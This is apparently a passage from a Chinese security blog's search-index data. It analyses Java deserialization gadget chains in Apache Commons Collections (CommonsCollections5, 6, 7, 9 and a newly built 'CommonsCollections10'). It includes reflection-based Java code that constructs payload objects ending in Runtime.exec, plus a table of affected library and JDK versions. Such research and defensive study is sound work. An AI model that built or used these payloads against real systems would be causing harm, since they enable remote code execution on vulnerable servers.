\u542f\u7528 \u5b89\u5168 \u7ba1\u7406 \u7406\u5668 \u7ba1\u7406\u5668 \u3002   \u6765\u770b \u4e00\u4e0b \u4e00 \u6574\u4e2a \u8c03\u7528 \u94fe   BadAttributeValueExpException . readObject ( )   - >   valObj . toString ( )   = >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )","title":"2 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections5"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#3-commonscollections6","text":"CommonsCollections6 \u662f \u53e6 \u4e00\u79cd \u66ff\u6362 \u65b9\u5f0f \uff0c \u540e \u534a \u90e8\u5206 \u7684 \u5229\u7528 \u94fe \u8fd8\u662f \u6ca1\u6709 \u53d8 \uff0c \u4e0d \u4f5c \u5206\u6790 \u3002   \u6211\u4eec \u5728 2 \u4e2d \u63d0\u5230 \u4e86 \u9664\u4e86 CommonsCollections5 \u7528 \u7684   toString   \u5916 \uff0c \u8fd8\u6709   hashCode   \u548c   equals   \u51fd\u6570 \u4e5f \u8c03\u7528 \u4e86 getValue \u51fd\u6570 \u3002 \u90a3\u4e48 \u662f\u5426 \u5b58\u5728 \u8c03\u7528 \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u7684 \u5bf9\u8c61 \u51fd\u6570 \u5462 \uff1f \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff01   CommonsCollections6 \u5229\u7528 \u4e86   TiedMapEntry   \u7684   hashCode   \u51fd\u6570 \uff0c \u6765 \u89e6\u53d1   LazyMap . get   \u6211\u4eec \u90fd \u77e5\u9053 HashSet \u96c6\u5408 \u91cc \u4e0d\u4f1a \u5b58\u5728 \u76f8\u540c \u7684 key \uff0c \u90a3\u4e48 \u662f \u5982\u4f55 \u5224\u65ad \u662f\u5426 \u662f\u5426\u662f \u76f8\u540c \u7684 key \u5462 \uff1f \u8fd9\u91cc \u5c31\u8981 \u7528\u5230 key \u7684 hashCode \u51fd\u6570 \u4e86 \uff0c \u5982\u679c key \u7684 \u503c \u76f8\u540c \uff0c \u5176 hashCode \u8fd4\u56de \u7684 \u503c \u4e5f \u662f \u76f8\u540c \u7684 \u3002 \u8fd9\u91cc \u7684 HashCode \u7684 \u8ba1\u7b97 \u5728 HashSet \u7684 put \u548c add \u51fd\u6570 \u5b8c\u6210 \uff0c \u5e76\u4e14 HashSet \u4ece \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u4e2d \u8fd8\u539f \u51fa\u6765 \u65f6\u4f1a \u81ea\u52a8 \u8c03\u7528 put \u51fd\u6570 \uff0c \u8fd9\u91cc \u5c31 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u53ef\u63a7 \u7684 \u5730\u65b9 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b HashSet \u7684   readObject   \u51fd\u6570   \u7ee7\u7eed \u8ddf put \u51fd\u6570 \uff0c \u8fd9\u91cc \u5176\u5b9e \u8c03\u7528 \u7684 \u662f HashMap \u7684 put \u51fd\u6570   \u5176\u4e2d \u5bf9 key \u8c03\u7528 \u7684   hash ( )   \u51fd\u6570 \u4f1a \u8c03\u7528   key . hashCode   \u51fd\u6570 \uff0c \u90a3\u4e48 \u73b0\u5728 \u5c31 \u5f88 \u6e05\u695a \u4e86 \uff0c \u6211\u4eec \u53ea\u8981 \u5c06 key \u7684 \u503c \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6784\u9020 \u597d \u7684   TiedMapEntry   \u5bf9\u8c61 \u5c31 \u53ef\u4ee5 \u4e86 \u3002 \u6ce8\u610f \uff0c \u8fd9\u91cc \u7684 key \u503c \u5176\u5b9e \u5c31\u662f   HashSet . add   \u7684 \u5b9e\u4f8b \uff0c \u5728 HashSet \u91cc \u7684 HashMap \u7c7b \u5c5e\u6027 \u53ea\u7528 \u5230 \u4e86 Key \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   HashSet . readObject ( )   - >   HashMap . put ( key )   = >   key . hashCode   = >   TiedMapEntry . hashCode   - >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )","title":"3 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections6"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#4-commonscollections7","text":"CommonsCollections7 \u7528 \u4e86 Hashtable \u6765 \u4ee3\u66ff   AnnotationInvocationHandler   \uff0c \u4e0d\u540c \u540c\u4e8e \u4e0d\u540c\u4e8e \u524d\u9762 \u4e24\u79cd CommonsCollections7 \u5e76\u672a \u4f7f\u7528   TiedMapEntry   \uff0c \u800c\u662f \u7528 \u4e86 \u76f8\u540c key \u51b2\u7a81 \u7684 \u65b9\u5f0f \u8c03\u7528   equals   \u6765 \u89e6\u53d1   Lazy . get   \u51fd\u6570 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b   Hashtable   \u7684   readObject   \u51fd\u6570   \u7ee7\u7eed \u8ddf\u8fdb   reconstitutionPut   \u8be5 \u51fd\u6570 \u5c06 \u586b\u5145 table \u7684 \u5185\u5bb9 \uff0c \u5176\u4e2d \u7b2c 1236 \u884c\u4ec5 \u5f53\u6709 \u91cd\u590d \u6570\u636e \u51b2\u7a81 \u65f6 \uff0c \u624d \u4f1a \u8fdb\u5165 \u4e0b\u9762 \u7684 if \u8bed\u53e5 \uff0c \u8fd9\u91cc \u6211\u4eec \u7ee7\u7eed \u8ddf\u8fdb   equals   \u51fd\u6570   \u8fd9\u91cc \u7684   equals   \u51fd\u6570 \u53d6\u51b3 \u53d6\u51b3\u4e8e   key   \u7684 \u5bf9\u8c61 \uff0c \u5229\u7528 \u94fe\u7528 \u7684 \u662f   LazyMap   \u5bf9\u8c61 \uff0c \u5b9e\u9645 \u8c03\u7528 \u7684 \u662f \u7236\u7c7b   AbstractMapDecorator   \u7684   equals   \u51fd\u6570   \u8fd9\u91cc \u53c8 \u8c03\u7528 \u4e86 map \u7684 equals \u51fd\u6570 \uff0c \u8fd9\u91cc \u5b9e\u9645 \u8c03\u7528 \u7684 \u662f HashMap \u7684 \u7236\u7c7b   AbstractMap   \u7684   equals   \u51fd\u6570   \u5728 \u7b2c 495 \u884c \u8c03\u7528 \u4e86   m . get   \u51fd\u6570 \uff0c \u6240\u4ee5 \u540e\u9762 \u53c8 \u662f \u6211\u4eec \u719f\u6089 \u7684   LazyMap . get   \u7684 \u5957\u8def \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   Hashtable . readObject ( )   - >   Hashtable . reconstitutionPut   - >   LazyMap . equals   = >   AbstractMapDecorator . equals   = >   AbstractMap . equals   - >   m . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )","title":"4 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections7"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#5","text":"CommonsCollections6 \u548c 7 \u7684 exp \u6784\u9020 \u6bd4\u8f83 \u590d\u6742 \u6bd4\u8f83\u590d\u6742 \uff0c \u8fd9\u91cc \u5355\u72ec \u62ff\u51fa \u6765\u8bb2 \u4e00\u4e0b \u3002","title":"5 .   \u5229\u7528 \u94fe \u6784\u9020"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#commonscollections6","text":"\u7ecf\u8fc7 \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 CommonsCollections6 \u9700\u8981 \u5c06 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b \u6dfb\u52a0 \u5230 HashSet \u7684 \u503c \u4e0a \u3002   \u7b80\u5355 \u7684 \u65b9\u6cd5 \u5c31\u662f \u76f4\u63a5 add   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   \" foo \"   ) ;   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   entry   ) ;   \u590d\u6742 \u4e00\u70b9 \uff0c \u5c31\u662f ysoserail \u91cc \u7684 \u5b9e\u73b0 \u65b9\u6cd5 \uff0c \u91c7\u7528 \u53cd\u5c04 \u673a\u5236 \u6765 \u5b8c\u6210   \u5176 \u601d\u8def \u4e3b\u8981 \u4e3a \uff1a   \u5b9e\u4f8b \u5316 \u4e00\u4e2a HashSet \u5b9e\u4f8b   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 HashSet \u7684 map \u7c7b \u5c5e\u6027   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 HashMap ( map \u7c7b \u5c5e\u6027 ) \u7684 table ( Node   ) \u7c7b \u5c5e\u6027   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 Node \u7684 key \u7c7b \u5c5e\u6027 \uff0c \u5e76 \u8bbe\u7f6e \u8be5 key \u7684 \u503c \u4e3a \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b   \u5177\u4f53 \u4ee3\u7801 \u5982\u4e0b   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   \" foo \"   ) ;   Field   f   =   null   ;   try   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" map \"   ) ;   / / \u83b7\u53d6 HashSet \u7684 map   Field \u5bf9\u8c61   }   catch   (   NoSuchFieldException   e   )   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" backingMap \"   ) ;   }   Permit   .   setAccessible   (   f   ) ;   / /   \u8bbe\u7f6e map \u53ef \u88ab \u8bbf\u95ee \u4fee\u6539   HashMap   innimpl   =   null   ;   innimpl   =   (   HashMap   )   f   .   get   (   map   ) ;   / /   \u83b7\u53d6 map \u5b9e\u4f8b \u7684 map \u7c7b \u5c5e\u6027   Field   f2   =   null   ;   try   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" table \"   ) ;   / /   \u83b7\u53d6 HashMap \u7684   table   field   }   catch   (   NoSuchFieldException   e   )   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" elementData \"   ) ;   }   Permit   .   setAccessible   (   f2   ) ;   / /   \u8bbe\u7f6e HashMap \u7684 field   \u53ef \u88ab \u8bbf\u95ee   Object   [ ]   array   =   new   Object   [   0   ]   ;   array   =   (   Object   [ ]   )   f2   .   get   (   innimpl   ) ;   Object   node   =   array   [   0   ]   ;   / /   \u83b7\u53d6 Node < k , v > \u5b9e\u4f8b   if   (   node   = =   null   ) {   node   =   array   [   1   ]   ;   }   Field   keyField   =   null   ;   try   {   keyField   =   node   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   / /   \u83b7\u53d6 Node \u7684 key   field   }   catch   (   Exception   e   ) {   keyField   =   Class   .   forName   (   \" java . util . MapEntry \"   ) .   getDeclaredField   (   \" key \"   ) ;   }   Permit   .   setAccessible   (   keyField   ) ;   / /   \u8bbe\u7f6e \u8be5 Field \u53ef \u88ab \u8bbf\u95ee \u4fee\u6539   keyField   .   set   (   node   ,   entry   ) ;   / /   \u5bf9 node \u5b9e\u4f8b \u586b\u5145 key \u7684 \u503c \u4e3a TiedMapEntry \u5b9e\u4f8b   \u7ecf\u8fc7 \u4e0a\u9762 \u7684 \u64cd\u4f5c \uff0c \u6700\u7ec8 \u7684 HashSet \u5b9e\u4f8b \u88ab \u6211\u4eec \u5d4c\u5165 \u4e86 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b \u3002   \u8fd9\u91cc \u5728 \u8c03\u8bd5 \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u7528 ysoserail \u7684 Reflections \u6765 \u7b80\u5316 exp \uff0c \u51fa\u6765 \u7684 \u7ed3\u679c \u6709\u70b9 \u4e0d \u4e00\u6837 \uff0c \u8fd8 \u6ca1\u6709 \u627e\u5230 \u5177\u4f53 \u7684 \u539f\u56e0 \u3002 \u5982\u679c \u6709 \u5e08\u5085 \u9047\u5230 \u8fc7 \u8fd9\u79cd \u95ee\u9898 \uff0c \u6b22\u8fce \u4e00\u8d77 \u8ba8\u8bba \u8ba8\u8bba \uff01","title":"CommonsCollections6"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#commonscollections7","text":"CommonsCollections \u5229\u7528 \u7684 \u662f key \u7684 hash \u51b2\u7a81 \u7684 \u65b9\u6cd5 \u6765 \u89e6\u53d1   equals   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4f1a \u8c03\u7528   LazyMap . get   \u51fd\u6570   \u90a3\u4e48 \u6784\u9020 exp \u7684 \u5173\u952e \u5c31\u662f \u6784\u9020 \u4e00\u4e2a hash \u51b2\u7a81 \u7684 LazyMap \u4e86 \u3002   \u8fd9\u91cc \u5927\u5bb6 \u53ef\u4ee5 \u8ddf \u4e00\u4e0b String . hashCode \u51fd\u6570 \uff0c \u4ed6 \u7684 \u8ba1\u7b97 \u65b9\u6cd5 \u8ba1\u7b97\u65b9\u6cd5 \u5b58\u5728 \u4e0d\u540c \u5b57\u7b26 \u5b57\u7b26\u4e32 \u76f8\u540c hash \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \uff0c \u4f8b\u5982 \u5982\u4e0b \u4ee3\u7801   CommonsCollections7 \u7528 \u7684 \u5c31\u662f \u8fd9\u4e2a bug \u6765 \u5236\u9020 hash \u51b2\u7a81 \u3002   \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u70b9 \u7684 \u662f \u89e6\u53d1 LazyMap . get \u51fd\u6570   \u8981 \u8d70 \u5230 \u7b2c 151 \u884c\u7ea2 \u6846\u6846 \u4e0a \uff0c \u9996\u5148 \u9700\u8981 \u6ee1\u8db3 \u7684 \u662f   map   \u91cc \u4e0d \u5b58\u5728 \u5f53\u524d \u8fd9\u4e2a   key   \u4f46\u662f \u660e\u663e \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u4e0d \u5b58\u5728 \u8fd9\u4e2a   key   \u540e \uff0c \u4f1a \u66f4\u65b0   map   \u7684 \u952e\u503c \uff0c \u8fd9 \u5c06 \u5bfc\u81f4 \u4e0b\u6b21 \u540c\u6837 \u7684   key   \u8fdb\u6765 \uff0c \u5c31 \u4e0d\u4f1a \u89e6\u53d1 \u540e\u7eed \u7684 payload \u4e86 \u3002 \u6211\u4eec \u5728 \u5199 exp \u7684 \u65f6\u5019 \u9700\u8981 \u6ce8\u610f \u5230 \u8fd9 \u4e00\u70b9 \u3002   \u6765\u770b \u4e00\u4e0b ysoserial \u7684 CommonsCollections7 \u662f \u600e\u4e48 \u7f16\u5199 \u7684 \uff01   Map   innerMap1   =   new   HashMap   ( ) ;   Map   innerMap2   =   new   HashMap   ( ) ;   / /   Creating   two   LazyMaps   with   colliding   hashes ,   in   order   to   force   element   comparison   during   readObject   Map   lazyMap1   =   LazyMap   .   decorate   (   innerMap1   ,   transformerChain   ) ;   lazyMap1   .   put   (   \" yy \"   ,   1   ) ;   Map   lazyMap2   =   LazyMap   .   decorate   (   innerMap2   ,   transformerChain   ) ;   lazyMap2   .   put   (   \" zZ \"   ,   1   ) ;   / /   Use   the   colliding   Maps   as   keys   in   Hashtable   Hashtable   hashtable   =   new   Hashtable   ( ) ;   hashtable   .   put   (   lazyMap1   ,   1   ) ;   hashtable   .   put   (   lazyMap2   ,   2   ) ;   Reflections   .   setFieldValue   (   transformerChain   ,   \" iTransformers \"   ,   transformers   ) ;   / /   Needed   to   ensure   hash   collision   after   previous   manipulations   lazyMap2   .   remove   (   \" yy \"   ) ;   \u5176\u4e2d \u7b2c \u4e24\u6b21 \u7684 put \u4f1a \u4f7f\u5f97 \u4f1a \u4f7f\u5f97 LazyMap2 \u4e2d \u589e\u52a0 \u4e86 yy \u8fd9\u4e2a \u952e\u503c \uff0c \u4e3a\u4e86 \u4fdd\u8bc1 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u4ecd\u7136 \u53ef\u4ee5 \u89e6\u53d1 \u540e\u7eed \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9\u91cc \u9700\u8981 \u5c06 lazyMap2 \u7684 yy \u952e\u503c remove \u6389 \u3002","title":"CommonsCollections7"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#6-commonscollections10","text":"\u7ecf\u8fc7 \u5bf9 \u524d\u9762 1 , 3 , 5 , 6 , 7 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u5176\u5b9e \u53ef\u4ee5 \u53d1\u73b0 \u5f88\u591a payload \u90fd \u662f \u201c \u6742\u4ea4 \u201d \u7684 \u6210\u679c \u3002 \u90a3\u4e48 \u6211\u4eec \u662f\u5426 \u80fd \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6784\u9020 \u51fa \u4e00\u4e2a \u65b0 \u7684 CommonsCollections \u7684 payload \u5462 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u8bb2 \u4e00\u4e0b \u6211 \u627e\u5230 \u7684 \u4e00\u4e2a \u65b0 payload \u5229\u7528 \u3002   \u8fd9\u4e2a payload \u4e3a CommonsCollections6 \u548c 7 \u7684 \u7ed3\u5408 \uff0c \u540c CommonsCollections6 \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u4e5f \u7528\u5230 \u4e86   TiedMapEntry   \u7684   hashCode   \u51fd\u6570   \u6211\u4eec \u5728 \u5206\u6790   Hashtable   \u7684   reconstitutionPut   \u51fd\u6570 \u65f6 \uff0c \u770b \u4e0b\u56fe   \u8be5 \u51fd\u6570 \u5728 \u7b2c 1234 \u884c\u5bf9   key   \u8c03\u7528 \u4e86 \u4e00\u6b21   hashCode   \u51fd\u6570 \uff0c \u90a3\u4e48 \u5f88 \u660e\u663e \uff0c \u5982\u679c key \u503c \u88ab \u4ee3\u66ff \u4e3a \u6784\u9020 \u597d \u7684   TiedMapEntry   \u5b9e\u4f8b \uff0c \u8fd9\u91cc \u6211\u4eec \u5c31 \u80fd \u89e6\u53d1   LazyMap . get   \u51fd\u6570 \uff0c \u540e\u7eed \u7684 \u8c03\u7528 \u94fe \u5c31 \u7c7b\u4f3c \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   Hashtable . readObject ( )   - >   Hashtable . reconstitutionPut   - >   key . hashCode ( )   = >   TiedMapEntry . hashCode ( )   - >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u5176\u5b9e \u4ece \u5229\u7528 \u94fe \u6765\u770b \uff0c \u4e0e CommonsCollections6 \u7684 \u533a\u522b \u5728\u4e8e \u524d\u90e8 \u7684 \u89e6\u53d1 \u4f7f\u7528 \u4e86 \u4e0d\u540c \u7684 \u5bf9\u8c61 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7ed3\u5408 \u7b2c 5 \u70b9 \u7684 \u5b66\u4e60 \uff0c \u6211\u4eec \u6765 \u5199 \u4e00\u4e0b \u8fd9\u4e2a payload \u7684 \u5229\u7528 \u94fe exp   final   Transformer   transformerChain   =   new   ChainedTransformer   (   new   Transformer   [ ]   { } ) ;   final   Map   innerMap   =   new   HashMap   ( ) ;   final   Map   innerMap2   =   new   HashMap   ( ) ;   final   Map   lazyMap   =   LazyMap   .   decorate   (   innerMap   ,   transformerChain   ) ;   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   \" foo \"   ) ;   Hashtable   hashtable   =   new   Hashtable   ( ) ;   hashtable   .   put   (   \" foo \"   ,   1   ) ;   / /   \u83b7\u53d6 hashtable \u7684 table \u7c7b \u5c5e\u6027   Field   tableField   =   Hashtable   .   class   .   getDeclaredField   (   \" table \"   ) ;   Permit   .   setAccessible   (   tableField   ) ;   Object   [ ]   table   =   (   Object   [ ]   )   tableField   .   get   (   hashtable   ) ;   Object   entry1   =   table   [   0   ]   ;   if   (   entry1   = =   null   )   entry1   =   table   [   1   ]   ;   / /   \u83b7\u53d6 Hashtable . Entry \u7684 key \u5c5e\u6027   Field   keyField   =   entry1   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   Permit   .   setAccessible   (   keyField   ) ;   / /   \u5c06 key \u5c5e\u6027 \u7ed9 \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b   keyField   .   set   (   entry1   ,   entry   ) ;   / /   \u586b\u5145 \u771f\u6b63 \u7684 \u547d\u4ee4 \u6267\u884c \u4ee3\u7801   Reflections   .   setFieldValue   (   transformerChain   ,   \" iTransformers \"   ,   transformers   ) ;   return   hashtable   ;","title":"6 .   \u6784\u9020 \u65b0 CommonsCollections10"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#7-commonscollections9","text":"\u627e\u5230 \u4e0a\u9762 CommonsCollections10 \u65f6 \uff0c \u5728 \u7f51\u4e0a \u627e \u4e86 \u4e00\u4e0b \u6ca1\u6709 \u6709\u6ca1\u6709 \u5e08\u5085 \u5df2\u7ecf \u6316\u5230 \u8fc7 \u4e86 \uff0c \u4e00\u5171 \u627e\u5230 \u4e0b\u9762 \u4e09\u4f4d \u5e08\u5085   https : / / github . com / Jayl1n / ysoserial / blob / master / src / main / java / ysoserial / payloads / CommonsCollections8 . java   https : / / github . com / frohoff / ysoserial / pull / 125 / commits / 4edf02ba7765488cac124c92e04c6aae40da3e5d   https : / / github . com / frohoff / ysoserial / pull / 116   \u4e00\u4e2a \u4e00\u4e2a \u6765\u8bf4   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a   Jayl1n   \u5e08\u5085 \u505a \u7684 \u6539\u53d8 \u4e3b\u8981 \u662f \u6700\u7ec8 \u7684 Runtime . getRuntime ( ) . exec \u6539\u6210 \u4e86 URLClassLoader . loadClass ( ) . newInstance \u7684 \u65b9\u5f0f \uff0c \u524d\u9762 \u7528 \u7684 \u8fd8\u662f CommonsCollections6 \uff0c \u8fd9\u91cc \u6682\u65f6 \u4e0d \u5c06 \u5176 \u5f52\u7c7b \u4e3a \u65b0 \u7684 \u5229\u7528 \u94fe \u3002   \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u662f   \u6885\u5b50 \u9152   \u5e08\u5085 \u63d0\u4ea4 \u7684 CommonsCollections9 \uff0c \u4e3b\u8981 \u5229\u7528 \u7684 \u662f CommonsCollections : 3.2 \u7248\u672c \u65b0\u589e \u7684   DefaultedMap   \u6765 \u4ee3\u66ff   LazyMap   \uff0c \u56e0\u4e3a \u8fd9 \u4e24\u4e2a Map \u6709 \u540c\u6837 \u7684 get \u51fd\u6570 \u53ef\u4ee5 \u88ab \u5229\u7528 \uff0c \u8fd9\u91cc \u4e0d\u518d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u3002   \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u662f   navalorenzo   \u5e08\u5085 \u63d0\u4ea4 \u7684 CommonsCollections8 \uff0c \u5176 \u5229\u7528 \u94fe \u57fa\u4e8e CommonsCollections : 4.0 \u7248\u672c \uff0c \u6682\u65f6 \u4e0d \u5728 \u672c\u7bc7 \u6587\u7ae0 \u7684 \u5206\u6790 \u8303\u56f4 \u5185 \uff0c \u540e\u9762 \u4f1a \u597d\u597d \u5206\u6790 \u4e00\u4e0b \u3002","title":"7 .   \u6885\u5b50 \u9152 \u5e08\u5085 \u7684 CommonsCollections9"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x03","text":"\u8054\u5408 \u524d\u9762 \u4e24\u7bc7 \u6587\u7ae0   CommonsCollections1   \u3001   CommonsCollections3   \uff0c \u5728 \u52a0\u4e0a \u672c\u6587 \u7684 CommonsCollections5 \uff0c 6 \uff0c 7 \uff0c 9 \uff0c 10 \u3002   \u7531\u4e8e \u7f51\u4e0a \u5df2\u7ecf \u6709 \u7c7b\u4f3c \u7684 \u6587\u7ae0 \u505a \u4e86   \u603b\u7ed3   \uff0c \u8fd9\u91cc \u5c31 \u7b80\u5355 \u505a \u4e00\u4e0b CommonsCollections < = 3.2 . 1 \u4e0b \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u603b\u7ed3 \u3002   \u8d77\u59cb \u70b9   AnnotationInvocationHandler   \u7684   readObject   BadAttributeValueExpException   \u7684   readObject   HashSet   \u7684   readObject   Hashtable   \u7684   readObject   \u91cd\u8981 \u7684 \u627f\u63a5 \u70b9   LazyMap   \u7684   get   DefaultedMap   \u7684   get   TiedMapEntry   \u7684   getValue   Proxy   \u7684   invoke   \u7ec8\u70b9   ChainedTransformer   \u7684   transform   InvokerTransformer   \u7684   transform   ConstantTransformer   \u7684   transform   \u5404 exp \u7684 jdk \u9002\u7528 \u7248\u672c   jdk7   = >   CommonsCollection1 \u3001 3   jdk7   &   jdk8   = >   CommonsCollections5 , 6 , 7 , 9 , 10   \u5404 exp \u7684 commons - collections \u9002\u7528 \u7248\u672c   commons - collections < = 3.1   CommonsCollections1 , 3 , 5 , 6 , 7 , 10   commons - collections < = 3.2 . 1   CommonsCollections1 , 3 , 5 , 6 , 7 , 9 , 10   \u6700\u540e \u7684 \u6700\u540e \uff0c commons - collections : 3 . x \u7248\u672c \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u5c31 \u5206\u6790 \u5230 \u8fd9\u91cc \uff0c \u5176\u5b9e \u6211 \u76f8\u4fe1 \u5982\u679c \u60f3 \u7ee7\u7eed \u6316 \u53ef \u4ee3\u66ff \u7684 \u5229\u7528 \u94fe \u8fd8\u662f \u4f1a \u6709 \u7684 \uff0c \u5c31 \u50cf \u672c\u6587 \u6316\u5230 \u7684 CommonsCollections10 \uff0c \u5982\u679c \u5404\u4f4d \u5e08\u5085 \u6709 \u5174\u8da3 \u53ef\u4ee5 \u7ee7\u7eed \u6316\u4e0b \u4e0b\u53bb \u6316\u4e0b\u53bb \uff0c \u4e5f \u6b22\u8fce \u548c \u5404\u4f4d \u5e08\u5085 \u4e00\u8d77 \u4ea4\u6d41 \u3002   \u540e\u7eed \u8fd8\u4f1a \u628a commons - collections : 4 \u7248\u672c \u7684 \u5229\u7528 \u94fe \u505a \u4e00\u4e2a \u5206\u6790 \uff0c \u6b22\u8fce \u4e00\u8d77 \u4ea4\u6d41 \uff1a \uff09","title":"0x03   \u603b\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/","tags":["java"],"text":"0x00   \u524d\u8a00   \u524d\u9762 \u51e0\u7bc7 \u6587\u7ae0 \uff0c \u5206\u6790 \u4e86 CommonsCollections : 3.2 . 1 \u7248\u672c \u4ee5\u4e0b \u5b58\u5728 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u94fe \u3002 \u4eca\u5929 \u5c06 \u7ee7\u7eed \u5206\u6790 CommonsCollections : 4.0 \u7248\u672c \uff0c \u4e3b\u8981 \u8bb2\u8ff0 CommonsCollections2 \uff0c 4 \uff0c 8 \u7684 \u5229\u7528 \u94fe \u6784\u9020 \u3002   0x01   \u524d\u666f \u56de\u987e   commons - collections : 4.0 \u7248\u672c \u5176\u5b9e \u5e76 \u6ca1\u6709 \u50cf 3.2 . 2 \u7248\u672c \u7684 \u4fee\u590d \u65b9\u5f0f \u4e00\u6837 \u505a\u62c9\u9ed1 \u5904\u7406 \uff0c \u6240\u4ee5 \u5728 3.2 . 1 \u53ca \u4ee5\u4e0b \u7684 \u5229\u7528 \u94fe \u6539\u6539 \u8fd8\u662f \u53ef\u4ee5 \u7528 \u7684 \u3002   \u4f8b\u5982 CommonsCollections5   final   Map   <   String   ,   String   >   innerMap   =   new   HashMap   ( ) ;   final   Map   lazyMap   =   LazyMap   .   lazyMap   (   innerMap   ,   transformerChain   ) ;   \u5c06 innerMap \u6539\u6210 \u952e\u503c \u5bf9 \u7684 \u7533\u660e \u65b9\u5f0f \u5373\u53ef \uff0c \u4f46\u662f \u5927\u5bb6 \u4e0d\u662f \u662f\u4e0d\u662f \u8fd8 \u8bb0\u5f97 \uff0c \u9664\u4e86 \u7528 LazyMap \u7684 \u65b9\u5f0f \uff0c CommonsCollections3 \u66fe \u63d0\u5230 \u8fc7 \u4f7f\u7528   TrAXFilter   \u7c7b \u521d\u59cb \u521d\u59cb\u5316 \u7684 \u65b9\u5f0f \u6765 \u8f7d\u5165 \u4efb\u610f \u7684 class   bytes \u6570\u7ec4 \u3002   commons - collections : 4.0 \u7248\u672c \u4e0b \u7684 \u5229\u7528 \u94fe \uff0c \u7528 \u7684 \u90fd \u662f TemplatesImpl \u4f5c\u4e3a \u6700\u7ec8 \u7684 \u547d\u4ee4 \u6267\u884c \u7684 \u4ee3\u7801 